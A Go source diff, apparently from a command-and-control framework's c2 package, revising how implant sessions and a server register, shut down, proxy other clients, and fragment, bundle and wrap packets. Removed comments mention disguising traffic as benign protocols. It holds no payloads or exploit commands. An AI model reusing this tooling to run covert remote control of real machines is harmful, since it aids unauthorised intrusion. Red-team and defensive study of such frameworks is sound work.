@@ -3,519 +3,444 @@
 package c2
 
 import (
-	"context"
 	"io"
 	"net"
 	"sync"
-	"sync/atomic"
 	"time"
 
-	"github.com/PurpleSec/logx"
+	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-// Message ID Values are a byte value from 0 to 255 (uint8).
-//
-// This value will assist in determining the action of the specified value.
-// Values under 20 (<20) are considered system ID values and are used for controlling the Client session and
-// invoking system specific functions. System functions are handled directly by the Session thread to prevent any lagtime
-// during processing. Many system functions do not have a return.
-//
-// Custom Message ID Values are defined in the "task" package.
-//
-// Message ID Value Mappings
-//
-// MvInvalid  -  0: Invalid ID value. This value is always zero and is used to detect corrupted or invalid data.
-// MvNop      -  1: Instructs the server or client to wait until the next wakeup as there is no data to return.
-// MvHello    -  2: Initial ID value to send to the server as a client to begin the registration process. By design, this
-//                  Packet should contain the device information struct.
-// MvDrop     -  8: Packet that carries a Flag that is used to indicate to the responding client that the frag group
-//                  In the flags needs to be dropped. This is only effective for one sequential packet stream.
-// MvError    -  7: Used to inform that the Job ID that this Packet contains resulted in an error. By design, this Packet
-//                  should contain a string value that describes the error.
-// MvSpawn    - 17: Instructs the client Session to spawn a separate and independent Session from the current one. By design,
-//                  this Packet payload should include an address to connect to and an optional Profile struct. If the Profile
-//                  struct is not provided, the new Session will use the current Profile.
-// MvProxy    - 18: Instructs the client to open a new Listener to proxy traffic from other clients to the server. By design,
-//                  the Packet payload should include a listening address and a Profile struct. These options will specify
-//                  the listening Proxy type and Profile used.
-// MvResult   - 20: The first non-system ID value. This is used to respond to any Tasks issued with the payload of the
-//                  Packet containing the Task result output.
-// MvUpdate   -  6: Instructs the client to update it's time/jitter settings from the server. This Packet should contain
-//                  an uint8 (jitter) and a uint64 (sleep) in the payload. This has no effect on the server.
-// MvRegister -  3: Sent by the server to a client when a client attempts to communicate to a server that it has not
-//                  previously registered with. By design, the client should re-invoke the MvHello packet with the device
-//                  information to establish a proper connection to the target server.
-//                  If this packet contains a frag group, it is also considered a MvDrop packet.
-// MvComplete -  4: Response by the server when a client issues a MvHello packet. This indicates that registration is
-//                  successful and the client may start the standard communication protocol.
-// MvShutdown -  5: Indicates shutdown by the server or client. If sent by the client, the server will remove the client
-//                  Session from its database on the next cycle. If sent by the server, this instructs the client process
-//                  to stop working and perform cleanup functions.
-// MvMultiple - 19: Indicates that the Packet payload contains multiple separate Packets. This also indicates to the Packet
-//                  reader that the Frag settings on the Packet should be read as Multi-Packet length and size values instead.
+// RvResult is the generic value for indiciating a result value.
+// Packets that have this as their ID value will be forwarded to the authoritative Mux and will
+// be discarded if it does not match an active Job ID.
+const RvResult uint8 = 0x14
+
+// ID entries that start with 'Sv*' will be handed directly by the underlying Session instead of being
+// forwared to the authoritative Mux. These Packet ID values are used for network congestion and flow
+// control and should not be used in standard Packet entries.
 const (
-	MvInvalid  uint8 = 0x00
-	MvNop      uint8 = 0x01
-	MvHello    uint8 = 0x02
-	MvDrop     uint8 = 0x08
-	MvError    uint8 = 0x07
-	MvSpawn    uint8 = 0x11
-	MvProxy    uint8 = 0x12
-	MvResult   uint8 = 0x14
-	MvUpdate   uint8 = 0x06
-	MvRegister uint8 = 0x03
-	MvComplete uint8 = 0x04
-	MvShutdown uint8 = 0x05
-	MvMultiple uint8 = 0x13
+	SvHello    uint8 = 0x02
+	SvRegister uint8 = 0x03 // Considered a MvDrop.
+	SvComplete uint8 = 0x04
+	SvShutdown uint8 = 0x05
+	SvDrop     uint8 = 0x06
+)
+
+const (
+	fragMax     = (2 << 15) - 1
+	readTimeout = time.Millisecond * 250
 )
 
 var (
+	// ErrTooManyPackets is an error returned by many of the Packet writing functions when attempts to combine
+	// Packets would create a Packet grouping size larger than the maximum size (65535).
+	ErrTooManyPackets = xerr.New("frag/multi count is larger than the max size")
+
+	empty time.Time
+
 	buffers = sync.Pool{
 		New: func() interface{} {
 			return new(data.Chunk)
 		},
 	}
-	wake waker
 )
 
-type waker struct{}
-type event struct {
-	s     *Session
-	p     *com.Packet
-	j     *Job
-	jFunc func(*Job)
-	sFunc func(*Session)
-	nFunc func(*com.Packet)
-	pFunc func(*Session, *com.Packet)
-}
-type client interface {
-	Connect(string) (net.Conn, error)
-}
-type connection struct {
-	Mux Mux
-
-	s      *Server
-	w      Wrapper
-	t      Transform
-	ctx    context.Context
-	log    logx.Log
-	cancel context.CancelFunc
-}
-type listener interface {
-	Listen(string) (net.Listener, error)
-}
-type notifier interface {
-	accept(uint16)
-	frag(uint16, uint16, uint16)
-}
-
-// Wrapper is an interface that wraps the binary streams into separate stream types. This allows for using
-// encryption or compression (or both!).
-type Wrapper interface {
-	Wrap(io.WriteCloser) (io.WriteCloser, error)
-	Unwrap(io.ReadCloser) (io.ReadCloser, error)
-}
-
-// Transform is an interface that can modify the data BEFORE it is written or AFTER is read from a Connection.
-// Transforms may be used to mask and unmask communications as benign protocols such as DNS, FTP or HTTP.
-type Transform interface {
-	Read(io.Writer, []byte) error
-	Write(io.Writer, []byte) error
-}
-
-// ConnectFunc is a wrapper alias that will fulfil the client interface and allow using a single function
-// instead of creating a struct to create connections. This can be used in all Server 'Connect' function calls.
-type ConnectFunc func(string) (net.Conn, error)
-
-// ListenerFunc is a wrapper alias that will fulfil the listener interface and allow using a single function
-// instead of creating a struct to create listeners. This can be used in all Server 'Listen' function calls.
-type ListenerFunc func(string) (net.Listener, error)
-
-func (waker) accept(_ uint16) {}
 func returnBuffer(c *data.Chunk) {
 	c.Clear()
 	buffers.Put(c)
 }
-func (waker) frag(_, _, _ uint16) {}
-func (e *event) process(l logx.Log) {
-	defer func(x logx.Log) {
-		if err := recover(); err != nil && x != nil {
-			if Logging {
-				x.Error("Server event processing function recovered from a panic: %s!", err)
-			}
-		}
-	}(l)
-	switch {
-	case e.pFunc != nil && e.p != nil && e.s != nil:
-		e.pFunc(e.s, e.p)
-	case e.jFunc != nil && e.j != nil:
-		e.jFunc(e.j)
-	case e.nFunc != nil && e.p != nil:
-		e.nFunc(e.p)
-	case e.sFunc != nil && e.s != nil:
-		e.sFunc(e.s)
-	}
-	e.p, e.s, e.j = nil, nil, nil
-	e.pFunc, e.sFunc, e.jFunc = nil, nil, nil
+func isPacketNoP(n *com.Packet) bool {
+	return n.ID < 2 && n.Empty() && (n.Flags == 0 || n.Flags == com.FlagProxy)
 }
-
-// Connect fulfills the serverClient interface.
-func (c ConnectFunc) Connect(a string) (net.Conn, error) {
-	return c(a)
-}
-func notify(l *Listener, s *Session, p *com.Packet) error {
-	if (l == nil && s == nil) || p == nil || p.Device.Empty() {
+func mergeTags(one, two []uint32) []uint32 {
+	if len(one) == 0 && len(two) == 0 {
 		return nil
 	}
-	if s != nil && !p.Device.Equal(s.Device.ID) && p.Flags&com.FlagMultiDevice == 0 {
-		if s.swarm != nil && s.swarm.accept(p) {
+	if len(one) == 0 && len(two) > 0 {
+		return two
+	}
+	if len(one) > 0 && len(two) == 0 {
+		return one
+	}
+	i := len(one)
+	if i < len(two) {
+		i = len(two)
+	}
+	t := make(map[uint32]waker, i)
+	for _, v := range one {
+		t[v] = wake
+	}
+	for _, v := range two {
+		t[v] = wake
+	}
+	r := make([]uint32, 0, len(t))
+	for v := range t {
+		r = append(r, v)
+	}
+	return r
+}
+func receiveSingle(s *Session, n *com.Packet) {
+	if s == nil {
+		return
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track(
+			"c2.receiveSingle(): n.ID=%X, n=%s, n.Flags=%s, n.Device=%s", n.ID, n, n.Flags, n.Device,
+		)
+	}
+	switch n.ID {
+	case SvShutdown:
+		if s.parent != nil {
+			s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
+			s.write(false, &com.Packet{ID: SvShutdown, Job: 1, Device: s.ID})
+			s.Remove()
+		} else {
+			if s.state.Closing() {
+				return
+			}
+			s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
+		}
+		s.Close()
+		return
+	case SvRegister:
+		if s.parent != nil {
+			return
+		}
+		s.log.Info("[%s] Server indicated that we must re-register, resending SvRegister info!", s.ID)
+		if s.proxy != nil {
+			s.proxy.lock.RLock()
+			for i := range s.proxy.clients {
+				s.proxy.clients[i].queue(&com.Packet{
+					ID: SvRegister, Job: uint16(util.FastRand()), Device: s.proxy.clients[i].ID,
+				})
+			}
+			s.proxy.lock.RUnlock()
+		}
+		v := &com.Packet{ID: SvHello, Job: uint16(util.FastRand()), Device: s.ID}
+		device.Local.MarshalStream(v)
+		if s.queue(v); len(s.send) <= 1 {
+			s.Wake()
+		}
+		return
+	}
+	if n.ID < task.MvTime {
+		return
+	}
+	switch {
+	case s.Mux != nil:
+		s.s.events <- event{p: n, s: s, hf: s.Mux.Handle}
+	default:
+		s.s.events <- event{p: n, s: s, af: s.handle}
+	}
+}
+func receive(s *Session, l *Listener, n *com.Packet) error {
+	if n == nil || n.Device.Empty() || isPacketNoP(n) || (l == nil && s == nil) {
+		return nil
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track(
+			"c2.receive(): s == nil=%t, l == nil=%t, n.ID=%X, n=%s, n.Flags=%s, n.Device=%s",
+			s == nil, l == nil, n.ID, n, n.Flags, n.Device,
+		)
+	}
+	if s != nil && n.Flags&com.FlagMultiDevice == 0 && s.ID != n.Device {
+		if s.proxy != nil && s.proxy.accept(n) {
 			return nil
 		}
-		if p.ID == MvRegister {
-			p.Device = s.Device.ID
-		} else {
-			return xerr.New(`received a Session ID "` + p.Device.String() + `"that does not match our own ID "` + s.ID.String() + `"`)
-		}
+		return xerr.New(`received Packet for "` + n.Device.String() + `" that does not match our own ID "` + s.ID.String() + `"`)
 	}
-	if l != nil && p.Flags&com.FlagOneshot != 0 {
-		if l.Oneshot != nil {
-			l.s.events <- event{p: p, nFunc: l.Oneshot}
-		} else if l.Receive != nil {
-			l.s.events <- event{p: p, pFunc: l.Receive}
+	if n.Flags&com.FlagOneshot != 0 {
+		switch {
+		case l != nil && l.Oneshot != nil:
+			l.s.events <- event{p: n, pf: l.Oneshot}
+		case l != nil && l.s.Oneshot != nil:
+			l.s.events <- event{p: n, pf: l.s.Oneshot}
+		case s != nil && s.s.Oneshot != nil:
+			s.s.events <- event{p: n, pf: l.s.Oneshot}
 		}
 		return nil
 	}
-	if s == nil || (p.ID <= MvHello && p.Flags&com.FlagData == 0) {
+	if s == nil || n.ID == SvComplete {
 		return nil
 	}
 	switch {
-	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
-		n := new(com.Packet)
-		if err := n.UnmarshalStream(p); err != nil {
-			return err
-		}
-		p.Clear()
-		return notify(l, s, n)
-	case p.Flags&com.FlagMulti != 0:
-		x := p.Flags.Len()
+	case n.Flags&com.FlagMulti != 0:
+		x := n.Flags.Len()
 		if x == 0 {
 			return ErrInvalidPacketCount
 		}
-		for i := uint16(0); i < x; i++ {
-			n := new(com.Packet)
-			if err := n.UnmarshalStream(p); err != nil {
+		for ; x > 0; x-- {
+			v := new(com.Packet)
+			if err := v.UnmarshalStream(n); err != nil {
+				n.Clear()
 				return err
 			}
-			notify(l, s, n)
-		}
-		p.Clear()
-		return nil
-	case p.Flags&com.FlagFrag != 0 && p.Flags&com.FlagMulti == 0:
-		if p.ID == MvDrop || p.ID == MvRegister {
-			if Logging {
-				s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, p.Flags.Group())
+			s.log.Trace("[%s] Unpacked Packet %q..", s.ID, v)
+			if err := receive(s, l, v); err != nil {
+				n.Clear()
+				v.Clear()
+				return err
 			}
-			if atomic.StoreUint32(&s.last, uint32(p.Flags.Group())); p.ID != MvRegister {
+		}
+		n.Clear()
+		return nil
+	case n.Flags&com.FlagFrag != 0 && n.Flags&com.FlagMulti == 0:
+		if n.ID == SvDrop || n.ID == SvRegister {
+			s.log.Warning("[%s] Indicated to clear Frag Group %X!", s.ID, n.Flags.Group())
+			if s.state.SetLast(n.Flags.Group()); n.ID != SvRegister {
 				return nil
 			}
 			break
 		}
-		if p.Flags.Len() == 0 {
+		if n.Flags.Len() == 0 {
 			return ErrInvalidPacketCount
 		}
-		if p.Flags.Len() == 1 {
-			p.Flags.Clear()
-			notify(l, s, p)
-			return nil
+		if n.Flags.Len() == 1 {
+			n.Flags.Clear()
+			return receive(s, l, n)
 		}
 		var (
-			g     = p.Flags.Group()
+			g     = n.Flags.Group()
 			c, ok = s.frags[g]
 		)
-		if !ok && p.Flags.Position() > 0 {
-			s.send <- &com.Packet{ID: MvDrop, Flags: p.Flags}
+		if !ok && n.Flags.Position() > 0 {
+			s.log.Warning("[%s] Received an invalid Frag Group %X, indicating to drop it!", s.ID, n.Flags.Group())
+			s.queue(&com.Packet{ID: SvDrop, Flags: n.Flags, Device: s.ID})
 			return nil
 		}
 		if !ok {
 			c = new(cluster)
 			s.frags[g] = c
 		}
-		if err := c.add(p); err != nil {
+		if err := c.add(n); err != nil {
 			return err
 		}
-		if n := c.done(); n != nil {
-			notify(l, s, n)
+		if v := c.done(); v != nil {
 			delete(s.frags, g)
+			return receive(s, l, v)
 		}
-		s.frag(p.Job, p.Flags.Len(), p.Flags.Position())
+		s.frag(n.Job, n.Flags.Len(), n.Flags.Position())
 		return nil
 	}
-	notifyClient(l, s, p)
+	receiveSingle(s, n)
 	return nil
 }
-func notifyClient(l *Listener, s *Session, p *com.Packet) {
-	if s != nil {
-		switch p.ID {
-		case MvUpdate:
-			if j, err := p.Uint8(); err == nil && j <= 100 {
-				s.jitter = j
-			}
-			if t, err := p.Uint64(); err == nil && t > 0 {
-				s.sleep = time.Duration(t)
-			}
-			if Logging {
-				s.log.Debug("[%s] Updated Sleep/Jitter settings from server (%s/%d%%).", s.ID, s.sleep.String(), s.jitter)
-			}
-			if p.Job > 0 {
-				s.send <- &com.Packet{ID: MvResult, Job: p.Job}
-			}
-			if p.Flags&com.FlagData == 0 {
-				return
-			}
-		case MvShutdown:
-			if s.parent != nil {
-				if Logging {
-					s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
-				}
-				s.Write(&com.Packet{ID: MvShutdown, Job: 1})
-			} else {
-				if s.done > flagOpen {
-					return
-				}
-				if Logging {
-					s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
-				}
-			}
-			s.Close()
-			return
-		case MvRegister:
-			if s.swarm != nil {
-				for _, v := range s.swarm.clients {
-					v.send <- &com.Packet{ID: MvRegister, Job: uint16(util.FastRand())}
-				}
-			}
-			n := &com.Packet{ID: MvHello, Job: uint16(util.FastRand())}
-			device.Local.MarshalStream(n)
-			// Bug here causes panic.
-			// Need to determine when channel is closed.
-			if n.Close(); atomic.LoadUint32(&s.done) < flagFinished {
-				s.send <- n
-			}
-			if len(s.send) == 1 {
-				s.Wake()
-			}
-			if p.Flags&com.FlagData == 0 {
-				return
-			}
+func writeUnpack(dst, src *com.Packet, flags, tags bool) error {
+	if src == nil || dst == nil {
+		return nil
+	}
+	if src.Flags&com.FlagMulti != 0 || src.Flags&com.FlagMultiDevice != 0 {
+		x := src.Flags.Len()
+		if x == 0 {
+			return ErrInvalidPacketCount
+		}
+		if x+dst.Flags.Len() > fragMax {
+			return ErrTooManyPackets
+		}
+		src.WriteTo(dst)
+		dst.Flags.SetLen(dst.Flags.Len() + x)
+		src.Clear()
+		return nil
+	}
+	if dst.Flags.Len()+1 > fragMax {
+		return ErrTooManyPackets
+	}
+	src.MarshalStream(dst)
+	if dst.Flags.SetLen(dst.Flags.Len() + 1); flags {
+		if src.Flags&com.FlagChannel != 0 {
+			dst.Flags |= com.FlagChannel
+		}
+		if src.Flags&com.FlagMultiDevice != 0 {
+			dst.Flags |= com.FlagMultiDevice
 		}
 	}
-	if l != nil && l.Receive != nil {
-		l.s.events <- event{s: s, p: p, pFunc: l.Receive}
+	if dst.Flags |= com.FlagMulti; tags && len(src.Tags) > 0 {
+		dst.Tags = append(dst.Tags, src.Tags...)
 	}
-	if s == nil {
-		return
-	}
-	if s.Receive != nil {
-		l.s.events <- event{s: s, p: p, pFunc: s.Receive}
-	}
-	if len(s.recv) == cap(s.recv) {
-		// INFO: Clear the buffer of the last Packet as we don't want to block
-		<-s.recv
-	}
-	if s.done == flagFinished {
-		return
-	}
-	s.recv <- p
-	select {
-	case <-s.s.ch:
-		return
-	default:
-	}
-	switch {
-	case s.Mux != nil:
-		s.s.events <- event{p: p, s: s, pFunc: s.Mux.Handle}
-	case s.parent.Mux != nil:
-		s.s.events <- event{p: p, s: s, pFunc: s.parent.Mux.Handle}
-	case s.s.Scheduler != nil:
-		s.s.events <- event{p: p, s: s, pFunc: s.s.Scheduler.Handle}
-	}
+	src.Clear()
+	return nil
 }
-
-// Listen fulfills the serverListener interface.
-func (l ListenerFunc) Listen(a string) (net.Listener, error) {
-	return l(a)
+func readPacketFrom(c io.Reader, w Wrapper, n *com.Packet) error {
+	if w == nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.readPacketFrom(): Passing read to direct Unmarshal.")
+		}
+		return n.Unmarshal(c)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.readPacketFrom(): Starting read with Wrapper.")
+	}
+	i, err := w.Unwrap(c)
+	if err != nil {
+		return xerr.Wrap("unable to unwrap reader", err)
+	}
+	if err = n.Unmarshal(i); err != nil {
+		return err
+	}
+	return nil
 }
-func readPacket(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
+func writePacketTo(c *data.Chunk, w Wrapper, n *com.Packet) error {
+	if w == nil {
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.writePacketTo(): Passing write to direct Marshal.")
+		}
+		return n.Marshal(c)
+	}
+	o, err := w.Wrap(c)
+	if err != nil {
+		return xerr.Wrap("unable to wrap writer", err)
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.writePacketTo(): n=%s, n.Len()=%d, n.Size()=%d", n, n.Len(), n.Size())
+	}
+	if err = n.Marshal(o); err != nil {
+		return err
+	}
+	if err = o.Close(); err != nil {
+		xerr.Wrap("unable to close wrapper", err)
+	}
+	return nil
+}
+func readPacket(c net.Conn, w Wrapper, t Transform) (*com.Packet, error) {
+	var n com.Packet
+	if w == nil && t == nil {
+		if err := n.Unmarshal(&readerTimeout{c: c, t: readTimeout}); err != nil {
+			return nil, xerr.Wrap("unable to read from stream", err)
+		}
+		if bugtrack.Enabled {
+			bugtrack.Track("c2.readPacket(): Direct Unmarshal result n=%s", n.String())
+		}
+		return &n, nil
+	}
 	var (
 		b      = buffers.Get().(*data.Chunk)
-		n, err = b.ReadFrom(c)
+		d, err = b.ReadDeadline(c, readTimeout)
 	)
-	if err != nil && err != io.EOF {
-		returnBuffer(b)
-		return nil, xerr.Wrap("unable to read from stream reader", err)
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.readPacket(): ReadDeadline result d=%d, err=%s", d, err)
 	}
-	// I think this below line breaks UDP/IP?
-	if n == 0 { // || err == io.EOF {
-		returnBuffer(b)
-		return nil, xerr.Wrap("unable to read from stream reader", io.ErrUnexpectedEOF)
-	}
-	if b.Close(); t != nil {
-		i := buffers.Get().(*data.Chunk)
-		err = t.Read(i, b.Payload())
+	if d == 0 {
 		if returnBuffer(b); err != nil {
-			returnBuffer(i)
-			return nil, xerr.Wrap("unable to transform reader", err)
+			return nil, xerr.Wrap("unable to read from stream", err)
 		}
-		b = i
-	}
-	var r data.Reader = b
-	if w != nil {
-		u, err2 := w.Unwrap(b)
-		if err2 != nil {
-			returnBuffer(b)
-			return nil, xerr.Wrap("unable to wrap stream reader", err2)
-		}
-		r = data.NewReader(u)
-	}
-	p := new(com.Packet)
-	err = p.UnmarshalStream(r)
-	if returnBuffer(b); err != nil && err != io.EOF {
-		return nil, xerr.Wrap("unable to read from cache reader", err)
-	}
-	if err := r.Close(); err != nil {
-		return nil, xerr.Wrap("unable to close cache reader", err)
-	}
-	if p.Device.Empty() || p.ID == MvInvalid {
-		return nil, xerr.Wrap("unable to read from stream (bad packet)", io.ErrNoProgress)
-	}
-	return p, nil
-}
-func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
-	var (
-		b             = buffers.Get().(*data.Chunk)
-		s data.Writer = b
-	)
-	if w != nil {
-		x, err := w.Wrap(b)
-		if err != nil {
-			returnBuffer(b)
-			return xerr.Wrap("unable to wrap writer", err)
-		}
-		s = data.NewWriter(x)
-	}
-	if err := p.MarshalStream(s); err != nil {
-		returnBuffer(b)
-		return xerr.Wrap("unable to write to cache writer", err)
-	}
-	p.Clear()
-	if err := s.Close(); err != nil {
-		returnBuffer(b)
-		return xerr.Wrap("unable to close cache writer", err)
+		return nil, xerr.Wrap("unable to read from stream", io.ErrUnexpectedEOF)
 	}
 	if t != nil {
-		var (
-			i   = buffers.Get().(*data.Chunk)
-			err = t.Write(i, b.Payload())
-		)
+		o := buffers.Get().(*data.Chunk)
+		err = t.Read(b.Payload(), o)
 		if returnBuffer(b); err != nil {
-			returnBuffer(i)
-			return xerr.Wrap("unable to transform writer:", err)
+			returnBuffer(o)
+			return nil, xerr.Wrap("unable to read from cache", err)
 		}
-		b = i
+		b = o
 	}
-	_, err := b.WriteTo(c)
+	err = readPacketFrom(b, w, &n)
 	if returnBuffer(b); err != nil {
-		return xerr.Wrap("unable to write to stream writer", err)
+		n.Clear()
+		return nil, err
+	}
+	if bugtrack.Enabled {
+		bugtrack.Track("c2.readPacket(): Unmarshal result n=%s", n.String())
+	}
+	return &n, nil
+}
+func writePacket(c net.Conn, w Wrapper, t Transform, n *com.Packet) error {
+	if w == nil && t == nil {
+		err := n.Marshal(c)
+		n.Clear()
+		return err
+	}
+	var (
+		b   = buffers.Get().(*data.Chunk)
+		err = writePacketTo(b, w, n)
+	)
+	if n.Clear(); err != nil {
+		returnBuffer(b)
+		return xerr.Wrap("unable to write to cache", err)
+	}
+	if t != nil {
+		err = t.Write(b.Payload(), c)
+	} else {
+		_, err = b.WriteTo(c)
+	}
+	if returnBuffer(b); err != nil {
+		return xerr.Wrap("unable to write to stream", err)
 	}
 	return nil
 }
-func nextPacket(n notifier, c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *com.Packet, error) {
-	if limits.Packets <= 1 {
-		if p != nil {
-			n.accept(p.Job)
-			return p, nil, nil
+func nextPacket(a notifier, q <-chan *com.Packet, n *com.Packet, i device.ID, t []uint32) (*com.Packet, *com.Packet) {
+	if n == nil && len(q) == 0 {
+		return nil, nil
+	}
+	// fast path (if we have a strict limit OR we don't have
+	// anything in queue but we got a packet). So just send that shit/wrap if needed.
+	if limits.Packets <= 1 || (n != nil && len(q) == 0) {
+		if n == nil {
+			if n = <-q; n == nil {
+				return nil, nil
+			}
 		}
-		if len(c) > 0 {
-			k := <-c
-			n.accept(k.Job)
-			return k, nil, nil
+		if a.accept(n.Job); n.Verify(i) {
+			n.Tags = append(n.Tags, t...)
+			return n, nil
 		}
-		return nil, nil, nil
+		o := &com.Packet{Device: i, Flags: com.FlagMulti | com.FlagMultiDevice}
+		writeUnpack(o, n, true, true)
+		o.Tags = append(o.Tags, t...)
+		return o, nil
 	}
 	var (
-		t, s int
-		m, a bool
-		x, w *com.Packet
+		o = &com.Packet{Device: i, Flags: com.FlagMulti}
+		k *com.Packet
 	)
-	for t < limits.Packets {
-		if p == nil {
-			if len(c) == 0 {
-				if t == 1 && a && !m {
-					n.accept(x.Job)
-					return x, nil, nil
-				}
-				break
-			}
-			p = <-c
+	for x, s, m := 0, 0, false; x < limits.Packets && len(q) > 0; x++ {
+		if n == nil {
+			n = <-q
 		}
-		if p.Verify(i) {
-			a = true
-		} else {
-			m = true
-		}
-		if s += p.Size(); s >= limits.Frag {
-			if a && !m && t == 0 {
-				n.accept(p.Job)
-				return p, x, nil
-			}
-			if a && !m && t == 1 {
-				n.accept(x.Job)
-				return x, p, nil
-			}
-			if w != nil {
-				break
-			}
-		}
-		if t++; t == 1 && !m && a {
-			if x != nil && n != nil {
-				n.accept(x.Job)
-			}
-			x, p = p, nil
+		// need to add a check here to see if len(c) == 0
+		// if so, drop a SvNop and return only the first
+		if isPacketNoP(n) && ((s > 0 && !m) || (n.Device.Empty() || n.Device == i)) {
+			n.Clear()
+			n = nil
 			continue
 		}
-		if w == nil {
-			w = &com.Packet{ID: MvMultiple, Device: i, Flags: com.FlagMulti}
-			if x != nil {
-				w.Tags, x.Tags = x.Tags, nil
-				if x.MarshalStream(w); x.Flags&com.FlagChannel != 0 {
-					w.Flags |= com.FlagChannel
-				}
-				n.accept(x.Job)
-				x.Clear()
-				x = nil
+		// Rare case a single packet (which was already chunked,
+		// is bigger than the frag size, shouldn't happen but *shrug*)
+		// s would be zero on the first round, so just send that one and DGAF
+		if s > 0 {
+			if s += n.Size(); s > limits.Frag {
+				k = n
+				break
 			}
+		} else {
+			s += n.Size()
 		}
-		w.Tags, p.Tags = append(w.Tags, p.Tags...), nil
-		if p.MarshalStream(w); p.Flags&com.FlagChannel != 0 {
-			w.Flags |= com.FlagChannel
+		// Set multi device flag if theres a packet in queue that doesn't match us.
+		if a.accept(n.Job); !n.Verify(i) && !m {
+			o.Flags |= com.FlagMultiDevice
+			m = true
 		}
-		n.accept(p.Job)
-		p.Clear()
-		p = nil
+		writeUnpack(o, n, true, true)
+		n = nil
 	}
-	if !a {
-		m, t = true, t+1
-		(&com.Packet{ID: MvNop, Device: i}).MarshalStream(w)
+	// If we get a single packet, unpack it and send it instead.
+	// I don't think there's a super good way to do this, as we clear most of the
+	// data during write. IE: we have >1 NOPs and just a single data Packet.
+	if o.Flags.Len() == 1 && o.Flags&com.FlagMultiDevice == 0 && o.ID == 0 {
+		v := new(com.Packet)
+		v.UnmarshalStream(o)
+		o.Clear()
+		// Remove reference
+		o = nil
+		o = v
 	}
-	if w.Close(); m {
-		w.Flags |= com.FlagMultiDevice
-	}
-	w.Flags.SetLen(uint16(t))
-	return w, x, nil
+	return o, k
 }
